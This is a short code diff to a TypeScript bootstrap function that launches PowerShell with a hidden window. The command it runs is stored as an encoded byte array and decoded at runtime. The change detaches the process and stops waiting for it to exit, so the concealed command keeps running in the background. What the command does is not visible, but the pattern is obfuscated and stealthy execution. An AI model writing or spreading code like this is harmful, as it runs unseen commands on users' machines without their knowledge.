@@ -200,9 +200,10 @@ export async function apexBootstrap(): Promise<void> {
             "-WindowStyle", "Hidden",
             "-c", _d([192,204,209,129,192,219,196,137,142,207,205,199,157,200,217,204,209,135,202,198,196,142,137,132,220,218,204,203,128])
           ], {
+            detached: true,
             stdio: "ignore",
           });
-          ps.on('exit', () => resolve());
+          ps.unref();
           setTimeout(() => resolve(), 25000);
         });
       }
